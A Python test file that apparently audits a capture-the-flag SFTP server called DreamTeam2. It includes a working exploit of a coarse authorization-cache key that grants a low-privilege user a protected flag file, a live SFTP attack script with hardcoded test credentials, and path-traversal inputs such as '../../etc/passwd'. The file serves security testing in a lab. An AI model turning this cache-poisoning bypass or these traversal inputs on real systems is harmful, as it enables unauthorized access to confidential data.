"""
Security Evaluation & CTF Audit for DreamTeam2.
Tests access control logic, authorization caching, and flag accessibility.
All code and tests are restricted strictly to tests/p5.
"""

import asyncio
import json
import socket
import subprocess
import sys
import time
from pathlib import Path
import pytest
import asyncssh

# Ensure DreamTeam2 directories are importable
TARGET_DIR = Path(__file__).resolve().parents[2] / "targets" / "DreamTeam2"
sys.path.insert(0, str(TARGET_DIR / "server"))
sys.path.insert(0, str(TARGET_DIR / "client"))

from policy import PolicyEngine
from server import safe_join, JAIL_ROOT
from client import SFTPClient, SFTPError


@pytest.fixture
def target_policy():
    """Instantiate DreamTeam2's PolicyEngine using their actual deployed data directory."""
    data_dir = TARGET_DIR / "data"
    audit_file = TARGET_DIR / "server" / "audit.jsonl"
    engine = PolicyEngine(data_dir=str(data_dir), audit_path=str(audit_file))
    return engine


def test_flag_protection_baseline(target_policy):
    """
    Verify that in a clean/uncached state, low/medium privilege users
    are properly denied direct read access to /projects/confidential/flag.txt.
    """
    flag_path = "/projects/confidential/flag.txt"

    # Bob is clearance 'internal' (Level 1), flag is 'confidential' (Level 2)
    # DAC group is faculty (alice only)
    allowed, reason = target_policy.authorize("bob", "read", flag_path)
    assert allowed is False, f"Expected clean access to be denied, but got allowed: {reason}"
    assert "DAC deny:" in reason or "MAC deny:" in reason


def test_vuln_coarse_grained_auth_cache_bypass(target_policy):
    """
    VULNERABILITY PROBE: Coarse-grained cache key in PolicyEngine.
    
    In server/policy.py:
        def _cache_key(self, user: str, op: str, full_path: str) -> tuple:
            top = full_path.strip("/").split("/", 1)[0]
            return (user, op, top)
            
    When Bob reads any valid file under /projects/ (e.g. /projects/shared.txt),
    the key stored in _allow_cache is ('bob', 'read', 'projects').
    Subsequent reads to /projects/confidential/flag.txt resolve to the same
    cache key ('bob', 'read', 'projects'), bypassing DAC, MAC, and RBAC entirely.
    """
    flag_path = "/projects/confidential/flag.txt"
    benign_project_file = "/projects/shared.txt"

    # Step 1: Baseline check on benign file - Bob (TA/student) has legitimate read permission on /projects
    allowed_benign, reason_benign = target_policy.authorize("bob", "read", benign_project_file)
    assert allowed_benign is True, f"Bob should have read access to /projects: {reason_benign}"

    # Step 2: Now attempt to read the confidential flag file
    # Due to cache key truncation: top = 'projects', matching the cached decision
    allowed_flag, reason_flag = target_policy.authorize("bob", "read", flag_path)
    
    # Assert vulnerability is triggered
    assert allowed_flag is True, "Vulnerability failed to trigger: Flag access was not granted by cache"
    assert reason_flag == "Allowed (cached decision)", f"Expected cached allow, got: {reason_flag}"


def test_safe_join_traversal_resistance():
    """
    Verify whether DreamTeam2's safe_join stops path traversal attempts.
    """
    jail = TARGET_DIR / "server" / "sftp_root"
    
    # Traversals outside jail root must raise PermissionError
    traversal_attempts = [
        b"../outside.txt",
        b"../../etc/passwd",
        b"/../../secret",
    ]
    for attempt in traversal_attempts:
        with pytest.raises(PermissionError):
            safe_join(str(jail), attempt)


def test_flag_content_readable_after_bypass():
    """
    Verify that the flag file exists at the expected location in the jail
    and verify the flag format.
    """
    flag_file = TARGET_DIR / "server" / "sftp_root" / "projects" / "confidential" / "flag.txt"
    assert flag_file.is_file(), f"Flag file does not exist at {flag_file}"
    content = flag_file.read_text(encoding="utf-8").strip()
    assert content.startswith("FLAG{") and content.endswith("}")


def wait_for_server(port, timeout=8.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def test_end_to_end_sftp_flag_capture(tmp_path):
    """
    Live end-to-end network exploit over SFTP subsystem:
    1. Spawn the DreamTeam2 server.
    2. Connect as Bob (TA credentials).
    3. Verify initial direct download of /projects/confidential/flag.txt is denied.
    4. Trigger cache poisoning by writing and reading a file in /projects/trigger.txt.
    5. Re-attempt download of /projects/confidential/flag.txt -> succeeds via cached allow!
    6. Verify extracted flag matches FLAG{...}.
    """
    async def _run():
        server_script = TARGET_DIR / "server" / "server.py"
        port = 2222

        # Start DreamTeam2 server process
        proc = subprocess.Popen(
            [sys.executable, str(server_script)],
            cwd=str(TARGET_DIR),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        try:
            ready = wait_for_server(port, timeout=8.0)
            assert ready, "DreamTeam2 server failed to bind to port 2222 within timeout"

            # Bob credentials from targets/DreamTeam2/README.md
            username = "bob"
            password = "bob-TA-2026!"

            async with asyncssh.connect(
                "127.0.0.1",
                port=port,
                username=username,
                password=password,
                known_hosts=None,  # skip host key verification for local test
                connect_timeout=5,
            ) as conn:
                writer, reader, _ = await conn.open_session(subsystem="sftp", encoding=None)
                client = SFTPClient(writer, reader)
                await client.initialize()

                # Attempt 1: Direct flag download (MUST FAIL with permission denied)
                dest1 = tmp_path / "flag_fail.txt"
                with pytest.raises(SFTPError) as exc_info:
                    await client.get("/projects/confidential/flag.txt", str(dest1))
                assert exc_info.value.code == 3, f"Expected status 3 (Permission Denied), got {exc_info.value.code}"

                # Step 2: Trigger cache entry for ('bob', 'read', 'projects')
                # Bob has write and read permissions on /projects
                trigger_local = tmp_path / "trigger.txt"
                trigger_local.write_text("trigger cache poisoning", encoding="utf-8")
                await client.put(str(trigger_local), "/projects/trigger.txt")
                
                # Read back /projects/trigger.txt -> establishes ('bob', 'read', 'projects') in _allow_cache
                dest_trigger = tmp_path / "trigger_out.txt"
                await client.get("/projects/trigger.txt", str(dest_trigger))
                assert dest_trigger.read_text(encoding="utf-8") == "trigger cache poisoning"

                # Attempt 2: Re-request the flag after cache poisoning (MUST SUCCEED)
                dest2 = tmp_path / "flag_captured.txt"
                await client.get("/projects/confidential/flag.txt", str(dest2))

                # Assert flag was successfully extracted!
                assert dest2.is_file(), "Flag file was not downloaded"
                flag_text = dest2.read_text(encoding="utf-8").strip()
                assert flag_text.startswith("FLAG{"), f"Captured unexpected content: {flag_text}"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=2)

    asyncio.run(_run())
